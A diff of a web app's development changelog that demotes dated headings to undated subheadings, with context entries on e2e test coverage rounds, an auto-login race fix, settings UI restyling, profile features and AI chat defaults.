 
 ---
 
-## 2026-05-19 — Spec 028 round 7: deeper API + SEO link shape + locale prefixes (develop-only)
+### Spec 028 round 7: deeper API + SEO link shape + locale prefixes (develop-only)
 
 Round 7 of the rolling e2e coverage buildout. 30 new spec files added on
 `develop` only (no cascade per operator instructions). Focus areas:
@@ -1036,7 +1124,7 @@ cascade to `stage` / `main` per operator instructions.
 
 ---
 
-## 2026-05-19 — Spec 028 round 6: PWA / RSC / CORS / a11y deeper (develop-only)
+### Spec 028 round 6: PWA / RSC / CORS / a11y deeper (develop-only)
 
 Round 6 of the rolling e2e coverage buildout. 35 new spec files added on
 `develop` only (no cascade per operator instructions). Focus areas:
@@ -1117,7 +1205,7 @@ cascade to `stage` / `main` per operator instructions.
 
 ---
 
-## 2026-05-19 — Spec 028 round 5: comparisons / CMS / dashboard surveys / extra hardening (develop-only)
+### Spec 028 round 5: comparisons / CMS / dashboard surveys / extra hardening (develop-only)
 
 Round 5 of the rolling e2e coverage buildout. 56 new spec files added on
 `develop` only (no cascade per operator instructions). Focus areas:
@@ -1212,7 +1300,7 @@ cascade to `stage` / `main` per operator instructions.
 
 ---
 
-## 2026-05-19 — Spec 028 round 4: payment providers + admin sub-systems (develop-only)
+### Spec 028 round 4: payment providers + admin sub-systems (develop-only)
 
 Round 4 of the rolling e2e coverage buildout. 22 new spec files added
 on `develop` only (no cascade per operator instructions). Focus areas:
@@ -1291,7 +1379,7 @@ Auth:
   tolerates 16 different codes (including XSS / traversal payloads);
   /auth/signout + /auth/verify-request render.
 
-## 2026-05-19 — Spec 028 round 3: hourly continuation batch (develop-only)
+### Spec 028 round 3: hourly continuation batch (develop-only)
 
 Round 3 of the rolling e2e coverage buildout. 28 new spec files added
 on `develop` only (no cascade per operator instructions). Focus areas:
@@ -1380,7 +1468,7 @@ Public coverage:
 - `public/ai-chat-disabled-tolerance.spec.ts` — chat plugin disabled
   state.
 
-## 2026-05-19 — Spec 028 round 2: large coverage batch (develop-only, no cascade)
+### Spec 028 round 2: large coverage batch (develop-only, no cascade)
 
 Operator asked for a 30-min batch focused on coverage breadth; do NOT
 cascade to stage/main until coverage is comprehensive. Updated the
@@ -1477,7 +1565,7 @@ All changes land on `develop` only via PR; per operator instruction,
 no cascade to stage/main this round. The hourly task #68 picks up
 the next gap iteration.
 
-## 2026-05-19 — Spec 028 round 1: CI workflow + initial gap-filling specs
+### Spec 028 round 1: CI workflow + initial gap-filling specs
 
 - `.github/workflows/e2e.yml` — Postgres-backed, sharded 4-way Playwright
   workflow. Runs on push to main/develop/stage and on PR. The repo had
@@ -1539,7 +1627,7 @@ The round-1 `autoLoginFiredRef` / `successHandledRef` useRef guards
 in `credentials-form.tsx` STAY — they were the actual bug-A fix and
 prevent the double-fire that originally motivated all of this.
 
-## 2026-05-19 — Spec 027 round 4: getSessionViaApi() to bypass Auth.js v5 page-context bug
+### Spec 027 round 4: getSessionViaApi() to bypass Auth.js v5 page-context bug
 
 - Round 3's `runtime = 'nodejs'` still failed: same fetch context,
   `/api/auth/session` returned `{user: …}` but `/client/dashboard`
@@ -1581,7 +1669,7 @@ prevent the double-fire that originally motivated all of this.
 - Spec 027 diagnosis updated; this is the round that lands the actual
   user-visible fix.
 
-## 2026-05-18 — Spec 027 follow-up: force-dynamic on auth-gated client pages
+### Spec 027 follow-up: force-dynamic on auth-gated client pages
 
 - After PR #853 landed the server-side signIn fix, re-running the
   Playwright repro against demo.ever.works showed the session cookie
@@ -1597,7 +1685,7 @@ prevent the double-fire that originally motivated all of this.
 - Spec 027 diagnosis updated to document both halves of the fix and
   why each is necessary on its own.
 
-## 2026-05-18 — Spec 027: fix post-register auto-login race (template prod)
+### Spec 027: fix post-register auto-login race (template prod)
 
 - `spec-027` filed under `docs/spec/027-fix-post-register-autologin/` and
   indexed in `docs/spec/README.md` as **shipped** (alongside this PR).
@@ -1622,15 +1710,15 @@ prevent the double-fire that originally motivated all of this.
 
 - `spec-029` Added Playwright coverage under `apps/web-e2e/tests/client/settings.spec.ts` asserting the new **Preferences** section is reachable from `/client/settings` and that the three always-on block headings (Layout / Container Width / Pagination Style) render — addresses Augment-review feedback that user-visible changes need at least one e2e assertion per `AGENTS.md` §9. PR #850.
 
-## 2026-05-18 — Spec 029: align preference block components with `/client/settings`
+### Spec 029: align preference block components with `/client/settings`
 
 - `spec-029` Visual refresh on the six block components rendered in both `SettingsModal` and the new `/client/settings` Preferences section: `SelectLayout`, `SelectContainerWidth`, `SelectPaginationType`, `SelectDatabaseMode`, `SelectCheckoutProvider`, `DatabaseStatusWarning`. Each card drops the glassmorphic surface (`bg-white/80 dark:bg-white/[0.04]`, faint `border-...[0.07]`, `group`, `transition-all`, `p-5`) for the page-card flat treatment (`bg-white dark:bg-[#111111]`, `border-gray-200 dark:border-white/6`, `shadow-sm`, `p-4`). Icon containers swap `bg-gray-100 dark:bg-white/5 p-2` with `h-5 w-5 text-gray-400` icons for the flat tinted `w-8 h-8 bg-theme-primary-50 dark:bg-theme-primary-900/30 rounded-lg` square with `w-4 h-4 text-theme-primary-600` icons — matching `SettingsCard`. Title typography goes from `text-base font-semibold leading-tight` to `text-sm font-semibold tracking-tight`; description from `text-sm text-gray-600 leading-relaxed mt-1` to `text-xs text-gray-500 mt-0.5`. `DatabaseStatusWarning` additionally has its mismatched gray-icon + blue-title normalized to the same neutral typography as the other blocks. Layout-option buttons, `SegmentedToggle`, `Select` dropdown, amber sub-warning, toast feedback, and all `useLayoutTheme` wiring untouched. Spec §6 updated. PR #850.
 
-## 2026-05-18 — Spec 029: align `SettingsModal` with `/client/settings` visual language
+### Spec 029: align `SettingsModal` with `/client/settings` visual language
 
 - `spec-029` `SettingsModal` surface drops glassmorphism (`bg-white/95 backdrop-blur-xl`, `rounded-2xl`, border `/[0.07]`) for the page-card flat treatment (`bg-white dark:bg-[#111111]`, `border-gray-200 dark:border-white/6`, `rounded-xl`). Backdrop simplifies from a heavy gradient + `backdrop-blur-2xl backdrop-saturate-150` to `bg-black/40 dark:bg-black/60 backdrop-blur-sm`. Header drops the gradient bg + shadow, replaces the gradient/bordered icon container with the page's flat tinted square (`w-8 h-8 bg-theme-primary-50 dark:bg-theme-primary-900/30 rounded-lg` + `w-4 h-4 text-theme-primary-600`), and dials the title from `text-xl font-bold` to `text-base font-semibold tracking-tight` matching the user-card name treatment. Close button loses `hover:scale-110` and uses the page's hover bg. Focus trap, Esc-to-close, body-scroll lock, and `animate-fade-in-up` entry all preserved. Spec updated under §6 Implementation Notes. PR #850.
 
-## 2026-05-18 — Spec 029: align header `SettingsButton` with `/client/settings` icon style
+### Spec 029: align header `SettingsButton` with `/client/settings` icon style
 
 - `spec-029` Header gear button (`apps/web/components/settings-button.tsx`) now uses the same tinted theme-primary square the `SettingsCard` icons use on `/client/settings` (`w-8 h-8 bg-theme-primary-50 dark:bg-theme-primary-900/30 rounded-lg` wrapper, `w-4 h-4 text-theme-primary-600 dark:text-theme-primary-400` icon, hover bumps the wrapper tint). Replaces the previous gray-on-transparent icon + `hover:scale-105` treatment so the header entry point reads as the same control system as the page. `FloatingSettingsButton` intentionally untouched — its solid theme-primary fill is the deliberate shortcut affordance. Spec updated under §6 Implementation Notes. PR #850.
 
@@ -1638,7 +1726,7 @@ prevent the double-fire that originally motivated all of this.
 
 - `spec-029` Drafted spec at `docs/spec/029-client-settings-preferences-section/spec.md` and indexed in `docs/spec/README.md`. Embeds the `SettingsModal` block components (`SelectLayout`, `SelectContainerWidth`, `SelectPaginationType`, plus demo-only `SelectDatabaseMode`, `SelectCheckoutProvider`, `DatabaseStatusWarning`) inline as a new **Preferences** section on `/client/settings` so the visual-preference controls are reachable from the settings hub. The modal stays exactly as-is for shortcut access from the header gear and floating button. Page-local primitives only — no shared settings shell extracted in this PR. Adds one new i18n key (`settings.PREFERENCES`) to all 21 locale files. PR #850.
 
-## 2026-05-18 — Spec 027 client notifications system (PR #852)
+### Spec 027 client notifications system (PR #852)
 
 - `spec-027` New spec `docs/spec/027-client-notifications/` (spec + plan +
   tasks) delivering the client-facing surface of
@@ -1713,7 +1801,7 @@ prevent the double-fire that originally motivated all of this.
 
 ---
 
-## 2026-05-15 — Spec 026 (EW-627): /client/dashboard UI ↔ API wiring fixes
+### Spec 026 (EW-627): /client/dashboard UI ↔ API wiring fixes
 
 - `spec-026` New spec `docs/spec/026-ew627-client-dashboard-wiring/` covering
   the seven wiring gaps audited in EW-627: hardcoded `Shares` pie slice,
@@ -1762,7 +1850,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
 
 ---
 
-## 2026-05-14 — Spec 025 (v4): inline sparkline inside the compact sidebar Statistics card
+### Spec 025 (v4): inline sparkline inside the compact sidebar Statistics card
 
 - `spec-025` Per user feedback v3 lost the chart by mistake — the
   intent was "keep the chart from v2, but keep the sidebar
@@ -1788,7 +1876,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
 
 ---
 
-## 2026-05-14 — Spec 025 (v3): revert Activity Overview, keep compact Statistics card in sidebar
+### Spec 025 (v3): revert Activity Overview, keep compact Statistics card in sidebar
 
 - `spec-025` Reverted v2's full-width Activity Overview panel and
   removed the new `/api/items/[slug]/activity` route + the
@@ -1807,7 +1895,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
 
 ---
 
-## 2026-05-14 — Spec 025 (v2): Activity Overview panel replaces sidebar Statistics card
+### Spec 025 (v2): Activity Overview panel replaces sidebar Statistics card
 
 - `spec-025` Revision in the same PR: the compact sidebar
   Statistics card shipped in the first iteration is replaced by a
@@ -1836,7 +1924,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
 
 ---
 
-## 2026-05-14 — Spec 025: Item detail Similar Products → carousel + new Statistics sidebar block
+### Spec 025: Item detail Similar Products → carousel + new Statistics sidebar block
 
 - `spec-025` On `/items/[slug]`, the old vertical "Similar Products"
   list in the right sidebar (`SimilarItemsSection`) is replaced by a
@@ -1874,7 +1962,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
   where the chat was made on by default. The "no key → launcher
   silently hidden" guard in `AiChatMount` is unchanged.
 
-## 2026-05-15 — Spec 023: AI Chat on by default (operator only sets `AI_CHAT_API_KEY`)
+### Spec 023: AI Chat on by default (operator only sets `AI_CHAT_API_KEY`)
 
 - `spec-023` Flipped the plugin schema default from
   `aiChat.enabled: false` to `aiChat.enabled: true` in
@@ -1895,7 +1983,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
   `aiChat` block is now fully optional and the only required step
   to activate the chat is setting `AI_CHAT_API_KEY`.
 
-## 2026-05-15 — Spec 023: AI Chat enabled-state e2e + markdown rendering
+### Spec 023: AI Chat enabled-state e2e + markdown rendering
 
 - `spec-023` T-005a shipped: assistant chat bubbles render
   through `apps/web/components/ai/ChatMarkdown.tsx`
@@ -1985,7 +2073,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
   viewer alongside the Edit-profile / Follow action). Discovery
   starts from a profile, not from the header nav. PR #816.
 
-## 2026-05-12 — Spec 022: 2-column dashboard layout for /client/profile (EW-613)
+### Spec 022: 2-column dashboard layout for /client/profile (EW-613)
 
 - `spec-022` AC-22 added: rebuilt the public profile page as a
   Toptal-style 2-column dashboard. New `ProfilePanel` component
@@ -2003,7 +2091,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
   `Card`, `theme-primary-*`, `rounded-xl`, dark-mode parity.
   Tracked under [EW-613](https://evertech.atlassian.net/browse/EW-613).
 
-## 2026-05-12 — Spec 022: stale-session fix extended to displayName
+### Spec 022: stale-session fix extended to displayName
 
 - `spec-022` Extended AC-21 to also cover `displayName`. The
   same staleness pattern that hit the avatar also hit the
@@ -2015,7 +2103,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
   displayName editor invalidates the cache via the new `onSaved`
   callback path. PR #816.
 
-## 2026-05-12 — Spec 022: avatar propagation fix
+### Spec 022: avatar propagation fix
 
 - `spec-022` AC-21 added: top-nav profile button (and anything
   else reading `useCurrentUser()`) was showing the stale NextAuth
@@ -2027,7 +2115,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
   basic-info form when the avatar value changes, so active
   subscribers refetch immediately. PR #816.
 
-## 2026-05-12 — Spec 022: new-follower notifications
+### Spec 022: new-follower notifications
 
 - `spec-022` AC-20: widened the `notifications.type` text enum
   with `'user_followed'` (no DB migration — column is plain TEXT,
@@ -2037,7 +2125,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
   their userId/username in the `data` JSON blob. Notification
   failures are logged but never break the follow. PR #816.
 
-## 2026-05-12 — Spec 022: profile-menu nav link for /client/users
+### Spec 022: profile-menu nav link for /client/users
 
 - `spec-022` AC-19: added a "Discover Users" entry to the
   profile-button dropdown (non-admin view) linking to
@@ -2047,7 +2135,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
   `common.DISCOVER_USERS_DESC` i18n keys (English; other locales
   fall back). PR #816.
 
-## 2026-05-12 — Spec 022: users directory at /client/users
+### Spec 022: users directory at /client/users
 
 - `spec-022` AC-18 added: new public users directory at
   `/client/users`. URL-driven server-side search (filters
@@ -2058,7 +2146,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
   the viewer's follow state. New `searchPublicProfiles` query in
   `client.queries.ts`. PR #816.
 
-## 2026-05-12 — Spec 022: followers / following drill-down pages
+### Spec 022: followers / following drill-down pages
 
 - `spec-022` AC-17 added: new pages
   `/client/profile/<username>/followers` and `.../following` render
@@ -2068,7 +2156,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
   stats-strip tiles ("Followers", "Following") link to these
   pages. PR #816.
 
-## 2026-05-12 — Spec 022: polish — recent activity feed + skills empty state
+### Spec 022: polish — recent activity feed + skills empty state
 
 - `spec-022` Added AC-15 (Recent Activity card on the About tab
   listing the last five comments authored by the profile owner via
@@ -2077,7 +2165,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
   empty-state card instead of showing a 0%-proficiency summary
   when the profile has no skills). PR #816.
 
-## 2026-05-12 — Spec 022: follow-up — public profiles, follows, inline edit
+### Spec 022: follow-up — public profiles, follows, inline edit
 
 - `spec-022` Extended Spec 022 with: public profile viewing (drop
   username-mismatch redirect; 404 on missing); new `user_follows`
@@ -2089,7 +2177,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
   About section, hitting the existing `PATCH /api/user/profile`
   route with optimistic UI. PR #816.
 
-## 2026-05-12 — Spec 022: profile UX polish (in-progress)
+### Spec 022: profile UX polish (in-progress)
 
 - `spec-022` New spec under `docs/spec/022-profile-ux-polish/`
   describing end-to-end persistence for the client profile:
@@ -2152,7 +2240,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
   capturing the testing investment that catches regressions like
   the paging + sort + redirect-loop bugs at PR time.
 
-## 2026-05-11 — Spec 020 follow-up: slugify-aware category state
+### Spec 020 follow-up: slugify-aware category state
 
 - `spec-020` Category-selection state mismatch (PRs #792 →
   #793 → #794). Clicking "Practices" applied the URL filter
@@ -2224,7 +2312,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
       as docs-only. Now all three patterns described in
       `docs/performance/locale-detection.md` are runnable.
 
-## 2026-05-10 — Spec 019: CDN-cacheable public surface + pluggable locale detection
+### Spec 019: CDN-cacheable public surface + pluggable locale detection
 
 - `spec-019` Drafted spec/plan/tasks for `019-cdn-cacheable-i18n` —
   fixes `demo.ever.works` shipping `Cache-Control: no-store` on
@@ -2276,7 +2364,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
   1.1-only `language` field. Same swap applied symmetrically to the
   Astro minimal template's `@ever-works/plugin-rss` package.
 
-## 2026-05-09 (cont)
+### (cont)
 
 - `app/rss.xml` `app/atom.xml` `app/feed.json` `lib/seo/feeds.ts`
   `app/[locale]/layout.tsx` `lib/seo/ai-crawlers.ts`
@@ -2306,7 +2394,7 @@ COMMENTS_RECEIVED}`, `TOP_ITEMS.{TITLE, ID, NO_DATA, NO_DATA_DESC}`)
     - `app/llms.txt/route.ts` advertises `/feed.json` and `/rss.xml`
       alongside the previously listed `/atom.xml` and `/sitemap.xml`.
 
-## 2026-05-09
+### 2026-05-09
 
 - `docs/log`
   Noted category sidebar and overflow tag dropdown virtualization for
